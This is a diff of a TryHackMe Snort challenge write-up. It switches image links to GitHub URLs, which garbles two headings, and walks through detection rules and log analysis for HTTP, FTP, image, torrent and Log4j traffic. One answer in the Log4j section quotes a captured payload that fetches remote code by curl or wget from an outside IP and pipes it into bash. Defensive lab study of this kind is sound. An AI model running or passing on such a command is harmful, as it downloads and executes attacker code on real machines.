@@ -17,7 +17,7 @@ For this particular scenario I will be ediiting the local rules present in the /
 snort -c local.rules -r torrent.pcap -l . -A console 
 ```
 
-![alt text](Images/Image.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image.png)
 
 **Rule Used:** Rule Used: alert tcp any any <> any 80 (msg: "TCP Packet Capture"; sid: 1000002; rev:4;)
 
@@ -27,11 +27,11 @@ I want to mention one thing, kindly kindly comment out the existing rules in the
 
 **Wrong Answer or Detection**
 
-![alt text](Images/Image-2.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-2.png)
 
 
 **Right Answer**
-![alt text](Images/Image-1.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-1.png)
 
 Lets now run snort and we will get the results: 
 ```
@@ -50,7 +50,7 @@ sudo snort -r snort.log.1792238124 -n 64
 
 **Answer** 0x2E6B5384
 
-![alt text](Images/Image-3.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-3.png)
 
 #### Question 4: Investigate the snort.log file. What is the SEQ number of packet 62?
 
@@ -66,7 +66,7 @@ sudo snort -r snort.log.1792238124 -n 64
 
 **Answer** 145.254.160.237
 
-![alt text](Images/Image-4.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-4.png)
 
 ## Writing FTP Rules for Analsis
 
@@ -74,7 +74,7 @@ sudo snort -r snort.log.1792238124 -n 64
 
 **Answer** 307
 
-![alt text](Images/Image-5.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-5.png)
 
 #### Question 2: Investigate the log file. What is the FTP service name?
 
@@ -86,7 +86,7 @@ sudo snort -X -d -e -r snort.log.1792239384 -n 10
 ```
 I just tried to dump it all for the first 10 packets and found the result eventually.
 
-![alt text](Images/Image-6.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-6.png)
 
 #### Question 3: Clear the previous log and alarm files. Deactivate/comment on the old rules. Write a rule to detect failed FTP login attempts in the given pcap. What is the number of detected packets?
 
@@ -97,7 +97,7 @@ so snort rule gets modifed like that:
 alert tcp any any <> any 21 (msg: "Traffic Activity with failed port 21 attempts"; content: "530"; sid: 1000001; rev:1;)
 
 
-![alt text](Images/Image-7.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-7.png)
 
 #### Question 4: Clear the previous log and alarm files.Deactivate/comment on the old rule.Write a rule to detect successful FTP logins in the given pcap. What is the number of detected packets?
 
@@ -105,7 +105,7 @@ alert tcp any any <> any 21 (msg: "Traffic Activity with failed port 21 attempts
 
 alert tcp any any <> any 21 (msg: "Traffic Activity with successfull port 21 Login"; content: "230"; sid: 1000001; rev:1;)
 
-![alt text](Images/Image-8.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-8.png)
 
 #### Question 5: Clear the previous log and alarm files. Deactivate/comment on the old rule.Write a rule to detect FTP login attempts with a valid username but no password entered yet. What is the number of detected packets?
 
@@ -113,7 +113,7 @@ alert tcp any any <> any 21 (msg: "Traffic Activity with successfull port 21 Log
 
 **Rule:** alert tcp any any <> any 21 (msg: "Username Entered Correct"; content: "331"; sid: 1000001; rev:1;)
 
-![alt text](Images/Image-9.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-9.png)
 
 #### Question 5: Clear the previous log and alarm files. Deactivate/comment on the old rule. Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet. What is the number of detected packets?
 
@@ -123,9 +123,9 @@ alert tcp any any <> any 21 (msg: "Traffic Activity with successfull port 21 Log
 
 To use an and condition add all the content you require in the same rule itself 
 
-![alt text](Images/Image-10.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-10.png)
 
-## Writing rules for Images/Image Files
+## Writing rules for https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image Files
 
 #### Question 1: Deactivate/comment on the old rule. Write a rule to detect the PNG file in the given pcap.Investigate the logs and identify the software used.
 
@@ -133,17 +133,17 @@ To use an and condition add all the content you require in the same rule itself
 **Answer:**
 **Rule Used:** alert tcp any any <> any any (msg: "GIF File Found"; content: "gif"; nocase; sid: 1000001; rev:1;)
 
-![alt text](Images/Image-11.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-11.png)
 
-#### Question 2: Deactivate/comment on the old rule. Write a rule to detect the GIF file in the given pcap.Investigate the logs and identify the Images/Image format embedded in the packet.
+#### Question 2: Deactivate/comment on the old rule. Write a rule to detect the GIF file in the given pcap.Investigate the logs and identify the https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image format embedded in the packet.
 
-![alt text](Images/Image-14.png)
-
-
-![alt text](Images/Image-13.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-14.png)
 
 
-![alt text](Images/Image-12.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-13.png)
+
+
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-12.png)
 
 ## Writing Rules for Torrent Meta Data Files
 
@@ -154,7 +154,7 @@ To use an and condition add all the content you require in the same rule itself
 
 **Rule:** alert tcp any any <> any any (msg: "Torrent Meta Data File Found"; content: "torrent"; sid: 1000001; rev:1;)
 
-![alt text](Images/Image-15.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-15.png)
 
 #### Question 2: 
 
@@ -174,7 +174,7 @@ snort -X -d -e r <filename>
 **Answer:** tracker2.torrentbox.com
 
 
-![alt text](Images/Image-16.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-16.png)
 
 ### Troubleshooting Rules
 
@@ -182,32 +182,32 @@ Troubleshoot and fix the rules
 
 #### Question 1: Fix the Rule
 
-![alt text](Images/Image-20.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-20.png)
 
 #### Question 2: Fix the Rule
 
-![alt text](Images/Image-19.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-19.png)
 
 #### Question 3: Fix the Rule
 
-![alt text](Images/Image-18.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-18.png)
 
 
 #### Question 4: Fix the Rule
 
-![alt text](Images/Image-17.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-17.png)
 
 #### Question 5: Fix the Rule
 
-![alt text](Images/Image-21.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-21.png)
 
 #### Question 7: Fix the rule
 
-![alt text](Images/Image-23.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-23.png)
 
 #### Question 7: Fix The Rule
 
-![alt text](Images/Image-22.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-22.png)
 
 ### Using External Rules
 
@@ -215,19 +215,19 @@ Troubleshoot and fix the rules
 
 **Answer** 25154
 
-![alt text](Images/Image-24.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-24.png)
 
 #### Question 1: Find number of detected packets with given rule local-1.rules
 
 **Answer:** 12
 
-![alt text](Images/Image-26.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-26.png)
 
 #### Question 2: Find THE request path from the given file
 
 **Answer:** 
 
-![alt text](Images/Image-25.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-25.png)
 
 
 #### Question 3: What is the request Path of the \log/alarm files
@@ -244,13 +244,13 @@ Troubleshoot and fix the rules
 
 **Answer:** 26
 
-![alt text](Images/Image-27.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-27.png)
 
 #### Question 2: Number of Rules Triggered (Local.rules)
 
 **Answer:** 4
 
-![alt text](Images/Image-28.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-28.png)
 
 #### Question 3: Number of Rules Triggered (Local.rules)
 
@@ -260,20 +260,20 @@ Troubleshoot and fix the rules
 
 **Answer:** 210037
 
-![alt text](Images/Image-29.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-29.png)
 
 #### Question 5: Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
 
 **Answer** 41
 
-![alt text](Images/Image-31.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-31.png)
 
 
 #### Question 6: What is the encoding format?
 
 **Answer:** Base64
 
-![alt text](Images/Image-30.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-30.png)
 
 
 #### Question 7: What is the id of the packet
@@ -284,13 +284,13 @@ Troubleshoot and fix the rules
 
 **Answer:** (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
 
-![alt text](Images/Image-34.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-34.png)
 
-![alt text](Images/Image-33.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-33.png)
 
 
 #### Question 9: Log4j CVSS Vulnerability
 
 **Answer** 9.3
 
-![alt text](Images/Image-32.png)
+![alt text](https://github.com/rishi-blueteam/TryHackMe-Rooms-Writeup/blob/main/Challenges/Snort%20-%20The%20Basic%20Challenge/Images/Image-32.png)
